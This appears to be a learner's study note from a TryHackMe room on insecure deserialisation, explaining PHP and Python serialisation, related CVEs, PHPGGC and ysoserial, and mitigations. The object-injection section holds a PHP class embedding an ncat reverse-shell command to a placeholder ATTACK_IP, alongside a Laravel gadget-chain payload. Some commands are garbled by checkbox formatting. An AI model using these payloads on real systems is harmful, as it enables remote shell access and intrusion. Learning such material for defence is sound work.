
📅 **Date**: 26 February 25  
📂 **Category**: TryHackMe 
📝 **Status**: Completed  
🔒 **Room**: Server Side Attack
🏷️ Tags: #tryhackme #tryhackme/learn

---
# Insecure Deserialisation

## Serialisation
- [ ] **Definition**: Process of converting an object's state into a storable or transmittable format.
- [ ] **Analogy**: Like packing a school bag with books, notebooks, lunchbox, etc.
- [ ] **Purpose**: Used in web applications to transfer data between systems or networks.
- [ ] **Example in PHP**:
```php
<?php
$noteArray = array("title" => "My THM Note", "content" => "Welcome to THM!");
$serialisedNote = serialize($noteArray);  // Serialisation
file_put_contents('note.txt', $serialisedNote);  // Saving to file
?>```

## Deserialisation
- [ ] **Definition**: Process of converting serialised data back into an object.
- [ ] **Analogy**: Like unpacking a school bag to use the items.
- [ ] **Purpose**: Retrieving data from files, databases, or networks.
- [ ] **Example in PHP**:
```php
<?php
$serialisedNote = file_get_contents('note.txt');  // Reading serialised data
$noteArray = unserialize($serialisedNote);  // Deserialisation
echo "Title: " . $noteArray['title'] . "<br>";
echo "Content: " . $noteArray['content'];
?>```

## Insecure Deserialisation Vulnerabilities
- [ ] **Risk**: Attackers can manipulate serialised data to execute unauthorised actions or steal data.
- [ ] **Examples**:
    1. **Log4j Vulnerability (CVE-2021-44228)**:
        - [ ] **Impact**: Remote code execution via insecure deserialisation in Apache Log4j.
    2. **WebLogic Server RCE (CVE-2015-4852)**:
        - [ ] **Impact**: Remote code execution via maliciously crafted objects.
    3. **Jenkins Java Deserialisation (CVE-2016-0792)**:
        - [ ] **Impact**: Arbitrary code execution via crafted serialisation payloads.
## Serialisation in Different Languages
- [ ] **PHP**:
    - [ ] **Serialisation**: `serialize()` function.
    - [ ] **Deserialisation**: `unserialize()` function.
    - [ ] **Magic Methods**:
        - [ ] `__sleep()`: Called before serialisation.
        - [ ] `__wakeup()`: Called after deserialisation.
        - [ ] `__serialize()`: Custom serialisation (PHP 7.4+).
        - [ ] `__unserialize()`: Custom deserialisation (PHP 7.4+).
- [ ] **Python**:
    - [ ] **Serialisation**: `pickle.dumps()`.
    - [ ] **Deserialisation**: `pickle.loads()`.
    - [ ] **Base64 Encoding**: Used to safely transmit binary data.
	
---
## Exploitation Techniques
1. **Modifying Serialised Data**:
    - [ ] Example: Changing `isSubscribed` from `false` to `true` in a serialised cookie.
    - [ ] **Impact**: Unauthorised access to premium features.
2. **Object Injection**:
    - [ ] **Vulnerability**: Insecure deserialisation allows injecting malicious objects.
    - [ ] **Example**:
	```php
	<?php
	class MaliciousUserData {
		public $command = 'ncat - [ ]nv ATTACK_IP 4444 -e /bin/sh';
	}
	$maliciousUserData = new MaliciousUserData();
	$serializedData = serialize($maliciousUserData);
	echo base64_encode($serializedData);
	?>
	```
    - [ ] **Impact**: Remote code execution via `__wakeup()` or `__destruct()`.
	
---
## Tools for Exploitation
1. **PHPGGC (PHP Gadget Chain)**:
    - [ ] **Purpose**: Generates gadget chains for PHP object injection.
    - [ ] **Usage**:
	```bash
		php phpggc Laravel/RCE3 system whoami
	``` 
    - [ ] **Example Payload**:
```php
O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:9:"*events";O:39:"Illuminate\Notifications\ChannelManager":3:{s:6:"*app";s:6:"whoami";s:17:"*defaultChannel";s:1:"x";s:17:"*customCreators";a:1:{s:1:"x";s:6:"assert";}}}
        ```
2. **Ysoserial (Java)**:
    - [ ] **Purpose**: Generates payloads for Java deserialisation vulnerabilities.
    - [ ] **Usage**:
```java
        java - [ ]jar ysoserial.jar CommonsCollections1 'calc.exe'
```
        
---
## Mitigation Strategies
1. **Red Team/Pentester Perspective**:
    - [ ] **Codebase Analysis**: Identify serialisation/deserialisation points.
    - [ ] **Vulnerability Identification**: Use static and dynamic analysis tools.
    - [ ] **Fuzzing**: Test with invalid or unexpected input data.
    - [ ] **Error Handling**: Assess how errors are handled during deserialisation.
2. **Secure Coder Perspective**:
    - [ ] **Avoid Insecure Formats**: Use JSON or XML instead of binary serialisation.
    - [ ] **Input Validation**: Validate and sanitise all inputs.
    - [ ] **Avoid `eval()` and `exec()`**: Prevent arbitrary code execution.
    - [ ] **Secure Coding Practices**: Follow least privilege, defence in depth, and fail-safe defaults.
    - [ ] **Adhere to Guidelines**: Follow language/framework-specific secure coding standards.

---
## Key Takeaways
- [ ] Serialisation and deserialisation are powerful but risky if not implemented securely.
- [ ] Insecure deserialisation can lead to remote code execution, data leakage, and unauthorised access.
- [ ] Tools like PHPGGC and Ysoserial automate exploitation but also help in identifying vulnerabilities.
- [ ] Mitigation involves secure coding practices, input validation, and avoiding insecure formats.
